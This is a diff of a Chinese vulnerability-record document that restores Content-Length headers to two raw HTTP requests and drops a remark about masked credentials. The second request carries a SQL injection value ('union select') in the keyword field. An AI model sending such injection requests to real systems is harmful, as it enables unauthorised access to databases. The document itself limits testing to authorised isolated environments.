@@ -41,7 +41,7 @@ schema_version: "1"
 
 ## 操作风险
 
-现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -204,12 +204,13 @@ Accept: */*
 Accept-Language: en-US;q=0.9,en;q=0.8
 Connection: close
 Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
 
 isDis=1
 
 ```
 
-> 请求长度说明：原资料 Content-Length 为 7；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 7；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNVTCicOUWOl5uiblE2D4qBRF9ibtyywNSy9RyHuW6oibRGWicMqIdd14I8LsibLyvicH5wVPX9YqVMjmBA/640?wx_fmt=png)
 
@@ -284,12 +285,13 @@ Accept-Language: en
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
 Connection: close
 Content-Type: application/x-www-form-urlencoded
+Content-Length: 54
 
 isDis=1&browserTypeId=160&keyword=a%' union select 1,'
 
 ```
 
-> 请求长度说明：原资料 Content-Length 为 54；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 54；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNVTCicOUWOl5uiblE2D4qBR6tyGC6iaZ8w0hiakGpOlhnFjn1NA6c48rZCiaBHNlDENn9hc7zupRGmwQ/640?wx_fmt=png)
 
